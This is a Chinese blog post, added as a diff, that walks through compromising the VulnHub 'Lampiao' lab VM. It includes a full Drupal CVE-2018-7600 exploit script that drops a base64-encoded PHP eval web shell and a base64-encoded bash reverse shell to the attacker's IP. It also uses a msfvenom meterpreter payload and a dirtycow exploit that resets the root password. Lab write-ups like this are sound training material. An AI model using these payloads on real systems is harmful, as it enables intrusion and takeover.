@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico?v=5.1.3">
+
+
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="vulnhub靶机-Lampiao">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-Lampiao">
+<meta property="og:url" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/index.html">
+<meta property="og:site_name" content="lyxhh">
+<meta property="og:description" content="vulnhub靶机-Lampiao">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/info-1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/info-2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/info-3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/info-4.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/info-5.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/info-6.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/info-7.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/info-8.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/info-9.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/info-10.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/info-11.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/info-12.png">
+<meta property="og:updated_time" content="2020-02-12T13:28:38.557Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="vulnhub-Lampiao">
+<meta name="twitter:description" content="vulnhub靶机-Lampiao">
+<meta name="twitter:image" content="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/info-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/"/>
+
+
+
+
+
+  <title>vulnhub-Lampiao | lyxhh</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">lyxhh</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lyxhh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lyxhh">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">vulnhub-Lampiao</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-11T20:35:35+08:00">
+                2020-02-11
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-02-12T21:28:38+08:00">
+                2020-02-12
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>vulnhub靶机-<a href="https://www.vulnhub.com/entry/lampiao-1,249/" target="_blank" rel="external">Lampiao</a><a id="more"></a></p>
+<p>kail: 192.168.1.14<br>Lampiao:192.168.1.15</p>
+<p><strong>日站从信息收集开始</strong></p>
+<p>探测Lampiao ip：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netdiscover -i eth0 -r 192.168.1.0/24</div></pre></td></tr></table></figure></p>
+<p>-i 指定网卡，-r指定网段。</p>
+<p><img src="/2020/02/11/vulnHub-Lampiao/info-1.png" alt="info-1"></p>
+<p>探测ip端口开放情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -v -n -Pn -sS -p- 192.168.1.15</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/11/vulnHub-Lampiao/info-2.png" alt="info-2"></p>
+<p>其中80端口 打开默认没任何东西，<br>1898浏览器访问，是一个站点，根据Powered by Drupal得知，是Drupal CMS.<br><img src="/2020/02/11/vulnHub-Lampiao/info-3.png" alt="info-3"></p>
+<p>whatweb查看下CMS信息，可以看到Drupal是7.x的版本:<br><img src="/2020/02/11/vulnHub-Lampiao/info-4.png" alt="info-4"></p>
+<p>直接百度搜索下漏洞信息，发现有个CVE-2018-7600，然后在github找到<a href="https://github.com/FireFart/CVE-2018-7600/" target="_blank" rel="external">exp</a><br><img src="/2020/02/11/vulnHub-Lampiao/info-5.png" alt="info-5"></p>
+<p>直接写入一句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo PD9waHAgQGV2YWwoJF9QT1NUWydjYWlkYW8nXSk7Pz4= | base64 -d  &gt; caidao2.php</div></pre></td></tr></table></figure></p>
+<p>完整代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python3</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string">Written by Christian Mehlmauer</span></div><div class="line"><span class="string">  https://firefart.at/</span></div><div class="line"><span class="string">  https://twitter.com/_FireFart_</span></div><div class="line"><span class="string">  https://github.com/FireFart</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">This script can be obtained from:</span></div><div class="line"><span class="string">  https://github.com/FireFart/CVE-2018-7600</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">Requirements:</span></div><div class="line"><span class="string">  - python3</span></div><div class="line"><span class="string">  - python requests (pip install requests)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">Usage:</span></div><div class="line"><span class="string">  - Install dependencies</span></div><div class="line"><span class="string">  - modify the HOST variable in the script</span></div><div class="line"><span class="string">  - run the code</span></div><div class="line"><span class="string">  - win</span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">HOST=<span class="string">"http://192.168.1.15:1898/"</span></div><div class="line"></div><div class="line">get_params = &#123;<span class="string">'q'</span>:<span class="string">'user/password'</span>, <span class="string">'name[#post_render][]'</span>:<span class="string">'passthru'</span>, <span class="string">'name[#markup]'</span>:<span class="string">'echo PD9waHAgQGV2YWwoJF9QT1NUWydjYWlkYW8nXSk7Pz4= | base64 -d  &gt; caidao2.php'</span>, <span class="string">'name[#type]'</span>:<span class="string">'markup'</span>&#125;</div><div class="line">post_params = &#123;<span class="string">'form_id'</span>:<span class="string">'user_pass'</span>, <span class="string">'_triggering_element_name'</span>:<span class="string">'name'</span>&#125;</div><div class="line">r = requests.post(HOST, data=post_params, params=get_params)</div><div class="line"></div><div class="line">m = re.search(<span class="string">r'&lt;input type="hidden" name="form_build_id" value="([^"]+)" /&gt;'</span>, r.text)</div><div class="line"><span class="keyword">if</span> m:</div><div class="line">    found = m.group(<span class="number">1</span>)</div><div class="line">    get_params = &#123;<span class="string">'q'</span>:<span class="string">'file/ajax/name/#value/'</span> + found&#125;</div><div class="line">    post_params = &#123;<span class="string">'form_build_id'</span>:found&#125;</div><div class="line">    r = requests.post(HOST, data=post_params, params=get_params)</div><div class="line">    print(r.text)</div></pre></td></tr></table></figure></p>
+<p>然后直接蚁剑连接：<br><img src="/2020/02/11/vulnHub-Lampiao/info-6.png" alt="info-6"></p>
+<p>反弹shell payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTQvNjY2NiAwPiYx | base64 -d |bash</div></pre></td></tr></table></figure></p>
+<p>直接用上面的payload反弹的shell，输入a，会显示两个a，实际是一个a，看起来难受，即，你想打add，实际屏幕上输出aadddd。</p>
+<p>这里将shell反弹到msf进行接下来的操作,先生成php反弹shell的代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.14 LPORT=6666</div></pre></td></tr></table></figure></p>
+<p>将生成的信息，通过蚁剑创建个php文件，名为shell.php<br><img src="/2020/02/11/vulnHub-Lampiao/info-7.png" alt="info-7"></p>
+<p>然后启动msfconsole，执行如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">msf5 &gt; use exploit/multi/handler </div><div class="line">msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</div><div class="line">payload =&gt; php/meterpreter/reverse_tcp</div><div class="line">msf5 exploit(multi/handler) &gt; show options </div><div class="line"></div><div class="line">Module options (exploit/multi/handler):</div><div class="line"></div><div class="line">   Name  Current Setting  Required  Description</div><div class="line">   ----  ---------------  --------  -----------</div><div class="line"></div><div class="line"></div><div class="line">Payload options (php/meterpreter/reverse_tcp):</div><div class="line"></div><div class="line">   Name   Current Setting  Required  Description</div><div class="line">   ----   ---------------  --------  -----------</div><div class="line">   LHOST                   yes       The listen address (an interface may be specified)</div><div class="line">   LPORT  4444             yes       The listen port</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Wildcard Target</div><div class="line"></div><div class="line"></div><div class="line">msf5 exploit(multi/handler) &gt; set lhost 0.0.0.0</div><div class="line">lhost =&gt; 0.0.0.0</div><div class="line">msf5 exploit(multi/handler) &gt; set lport 6666</div><div class="line">lport =&gt; 6666</div><div class="line">msf5 exploit(multi/handler) &gt; exploit </div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 0.0.0.0:6666</div></pre></td></tr></table></figure></p>
+<p>浏览器访问：<code>http://192.168.1.15:1898/shell.php</code><br>反弹shell至msf中：<br><img src="/2020/02/11/vulnHub-Lampiao/info-8.png" alt="info-8"></p>
+<p>然后执行shell命令,之后通过python转 交互shell，<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; shell</div><div class="line">Process 3478 created.</div><div class="line">Channel 1 created.</div><div class="line"></div><div class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</div><div class="line">www-data@lampiao:/var/www/html$ whoami</div><div class="line">www-data</div></pre></td></tr></table></figure></p>
+<p>接在提权，下载提权辅助工具<a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="external">linux-exploit-suggester.sh</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/11/vulnHub-Lampiao/info-9.png" alt="info-9"></p>
+<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line">[+] [CVE-2017-16995] eBPF_verifier</div><div class="line"></div><div class="line">   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html</div><div class="line">   Exposure: highly probable</div><div class="line">   Tags: debian=9.0&#123;kernel:4.9.0-3-amd64&#125;,fedora=25|26|27,[ ubuntu=14.04 ]&#123;kernel:4.4.0-89-generic&#125;,ubuntu=(16.04|17.04)&#123;kernel:4.(8|10).0-(19|28|45)-generic&#125;</div><div class="line">   Download URL: https://www.exploit-db.com/download/45010</div><div class="line">   Comments: CONFIG_BPF_SYSCALL needs to be set &amp;&amp; kernel.unprivileged_bpf_disabled != 1</div><div class="line"></div><div class="line">[+] [CVE-2017-1000112] NETIF_F_UFO</div><div class="line"></div><div class="line">   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1</div><div class="line">   Exposure: highly probable</div><div class="line">   Tags: [ ubuntu=14.04&#123;kernel:4.4.0-*&#125; ],ubuntu=16.04&#123;kernel:4.8.0-*&#125;</div><div class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c</div><div class="line">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c</div><div class="line">   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at &apos;ext-url&apos; adds support for additional distros/kernels</div><div class="line"></div><div class="line">[+] [CVE-2016-8655] chocobo_root</div><div class="line"></div><div class="line">   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1</div><div class="line">   Exposure: highly probable</div><div class="line">   Tags: [ ubuntu=(14.04|16.04)&#123;kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic&#125; ]</div><div class="line">   Download URL: https://www.exploit-db.com/download/40871</div><div class="line">   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled</div><div class="line"></div><div class="line">[+] [CVE-2016-5195] dirtycow</div><div class="line"></div><div class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</div><div class="line">   Exposure: highly probable</div><div class="line">   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,[ ubuntu=16.04|14.04|12.04 ]</div><div class="line">   Download URL: https://www.exploit-db.com/download/40611</div><div class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</div><div class="line"></div><div class="line">[+] [CVE-2016-5195] dirtycow 2</div><div class="line"></div><div class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</div><div class="line">   Exposure: highly probable</div><div class="line">   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;</div><div class="line">   Download URL: https://www.exploit-db.com/download/40839</div><div class="line">   ext-url: https://www.exploit-db.com/download/40847.cpp</div><div class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</div><div class="line"></div><div class="line">[+] [CVE-2017-6074] dccp</div><div class="line"></div><div class="line">   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3</div><div class="line">   Exposure: probable</div><div class="line">   Tags: [ ubuntu=(14.04|16.04) ]&#123;kernel:4.4.0-62-generic&#125;</div><div class="line">   Download URL: https://www.exploit-db.com/download/41458</div><div class="line">   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass</div><div class="line"></div><div class="line">[+] [CVE-2016-2384] usb-midi</div><div class="line"></div><div class="line">   Details: https://xairy.github.io/blog/2016/cve-2016-2384</div><div class="line">   Exposure: probable</div><div class="line">   Tags: [ ubuntu=14.04 ],fedora=22</div><div class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c</div><div class="line">   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user</div><div class="line"></div><div class="line">[+] [CVE-2015-3202] fuse (fusermount)</div><div class="line"></div><div class="line">   Details: http://seclists.org/oss-sec/2015/q2/520</div><div class="line">   Exposure: probable</div><div class="line">   Tags: debian=7.0|8.0,[ ubuntu=* ]</div><div class="line">   Download URL: https://www.exploit-db.com/download/37089</div><div class="line">   Comments: Needs cron or system admin interaction</div><div class="line"></div><div class="line">[+] [CVE-2015-1318] newpid (apport)</div><div class="line"></div><div class="line">   Details: http://openwall.com/lists/oss-security/2015/04/14/4</div><div class="line">   Exposure: probable</div><div class="line">   Tags: [ ubuntu=14.04 ]</div><div class="line">   Download URL: https://gist.githubusercontent.com/taviso/0f02c255c13c5c113406/raw/eafac78dce51329b03bea7167f1271718bee4dcc/newpid.c</div><div class="line"></div><div class="line">[+] [CVE-2017-7308] af_packet</div><div class="line"></div><div class="line">   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html</div><div class="line">   Exposure: less probable</div><div class="line">   Tags: ubuntu=16.04&#123;kernel:4.8.0-(34|36|39|41|42|44|45)-generic&#125;</div><div class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c</div><div class="line">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c</div><div class="line">   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at &apos;ext-url&apos; adds support for additional kernels</div><div class="line"></div><div class="line">[+] [CVE-2016-9793] SO_&#123;SND|RCV&#125;BUFFORCE</div><div class="line"></div><div class="line">   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793</div><div class="line">   Exposure: less probable</div><div class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c</div><div class="line">   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only</div><div class="line"></div><div class="line">[+] [CVE-2016-4557] double-fdput()</div><div class="line"></div><div class="line">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808</div><div class="line">   Exposure: less probable</div><div class="line">   Tags: ubuntu=16.04&#123;kernel:4.4.0-(21|38|42|98|140)-generic&#125;</div><div class="line">   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip</div><div class="line">   Comments: CONFIG_BPF_SYSCALL needs to be set &amp;&amp; kernel.unprivileged_bpf_disabled != 1</div><div class="line"></div><div class="line">[+] [CVE-2015-1318] newpid (apport) 2</div><div class="line"></div><div class="line">   Details: http://openwall.com/lists/oss-security/2015/04/14/4</div><div class="line">   Exposure: less probable</div><div class="line">   Tags: ubuntu=14.04.2</div><div class="line">   Download URL: https://www.exploit-db.com/download/36782</div><div class="line"></div><div class="line">[+] [CVE-2016-0728] keyring</div><div class="line"></div><div class="line">   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/</div><div class="line">   Exposure: less probable</div><div class="line">   Download URL: https://www.exploit-db.com/download/40003</div><div class="line">   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working</div></pre></td></tr></table></figure></p>
+<p>有两个脏牛dirtycow可以用，下载<br><code>wget https://www.exploit-db.com/download/40847.cpp</code></p>
+<p>打开40847.cpp，可以看到使用方法：<br><img src="/2020/02/11/vulnHub-Lampiao/info-10.png" alt="info-10"></p>
+<p>编译:<br><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o exp 40847-zn.cpp -lutil</code></p>
+<p>执行:<br><code>./exp</code><br>root密码被更改为<code>dirtyCowFun</code><br><img src="/2020/02/11/vulnHub-Lampiao/info-11.png" alt="info-11"></p>
+<p>然后登陆靶机Lampiao,获取flag<br><img src="/2020/02/11/vulnHub-Lampiao/info-12.png" alt="info-12"></p>
+<p>用<code>bash -i &gt;&amp; /dev/tcp/192.168.1.14/6666 0&gt;&amp;1</code>反弹shell的时候遇到的问题，就是反弹回来之后，你输入a，屏幕自动变为aa？？？不知道啥情况。<br>还有就是提权的时候，使用脏牛有点不稳定，有时可以，有时不行。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>穷困潦倒的安全工作者，如果文章对您有所帮助，可以选择性打赏。</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/WeChatQR.JPG" alt="lyxhh 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lyxhh
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/" title="vulnhub-Lampiao">http://www.lxhsec.com/2020/02/11/vulnHub-Lampiao/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/03/php-mipcms/" rel="next" title="php-mipcms">
+                <i class="fa fa-chevron-left"></i> php-mipcms
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
